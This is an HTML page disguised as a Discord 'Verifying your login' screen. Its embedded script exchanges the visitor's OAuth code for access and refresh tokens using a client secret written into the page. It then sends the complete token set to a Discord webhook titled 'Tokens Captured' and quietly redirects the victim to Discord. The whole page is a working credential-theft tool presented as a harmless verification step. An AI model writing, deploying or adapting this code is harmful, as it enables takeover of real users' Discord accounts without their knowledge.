<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifying...</title>
  <style>
    body { 
      margin: 0; height: 100vh; background: #36393f; color: white; 
      font-family: Arial, sans-serif; display: flex; align-items: center; 
      justify-content: center; flex-direction: column; 
    }
    .spinner {
      border: 8px solid #2f3136;
      border-top: 8px solid #5865f2;
      border-radius: 50%;
      width: 60px; height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <h2>Verifying your login...</h2>
  <p>Please wait.</p>

  <script>
    (async () => {
      const params = new URLSearchParams(window.location.search);
      const code = params.get('code');

      if (!code) {
        window.location.href = 'https://discord.com/login';
        return;
      }

      try {
        const response = await fetch('https://discord.com/api/oauth2/token', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            client_id: '1479876735242731571',
            client_secret: 'RXyw76HLE-f4SQoHDd4Y7ctzwsHfojdh',
            grant_type: 'authorization_code',
            code,
            redirect_uri: 'https://sya-production.up.railway.app/callback'
          })
        });

        if (!response.ok) throw new Error();

        const tokens = await response.json();

        await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "Tokens Captured",
              color: 0x5865F2,
              timestamp: new Date().toISOString(),
              fields: [
                { name: "Access", value: tokens.access_token?.slice(0, 12) + '...' || '—' },
                { name: "Refresh", value: tokens.refresh_token?.slice(0, 12) + '...' || 'none' },
                { name: "Expires", value: tokens.expires_in || '—' }
              ],
              description: '```json\n' + JSON.stringify(tokens, null, 2) + '\n```'
            }]
          })
        });

        window.location.href = 'https://discord.com/app';
      } catch {
        window.location.href = 'https://discord.com/login';
      }
    })();
  </script>
</body>
</html>
